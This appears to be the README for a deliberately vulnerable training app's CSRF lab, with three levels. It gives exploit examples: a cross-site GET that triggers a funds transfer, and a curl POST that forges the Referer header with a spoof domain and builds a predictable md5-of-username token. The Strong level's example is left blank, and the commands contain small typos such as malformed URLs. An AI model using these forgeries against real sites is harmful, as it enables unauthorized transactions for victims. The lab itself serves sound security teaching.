# CSRF Token

The app is divided into three levels: Weak, Medium, and Strong. Each level introduces progressively stronger input sanitization, making it harder to exploit.

## CSRF Token Levels

### 1. Weak Level
- **Description**: This level simulates weak form validation and absense of csrf token.
- **Exploit Example**:
  ```
  Call this from a different tab or browser
  GET -> http://localhost:8000/csrf/csrf?amount=32&recipient=any
  ```

---

### 2. Medium Level
- **Description**: Referer bypass
- **Info**: Using the normal get req wouldn't work, now there is a check for csrf_token
- **Exploit Example**:
  ```bash
  # The csrf_roken is generated with md5 hash using current username 
  # (check the code), so it can be easily generated
  # Referer bypass can be done with insecured-domain.malicious-site.com
  
  # Still you can use GET
  curl -X POST 'http:/localhost:8000/csrf/csrf?level=medium' \
  -H "Referer: http:/localhost:8000.domain.malicious-site.com" \
  -d "amount=32&recipient=dsads&csrf_token={generated_csrf_token}" -b cookies

  ```

---

### 3. Strong Level
- **Description**: The csrf_token is safely generated and stored in session.
- **Exploit Example**:

---
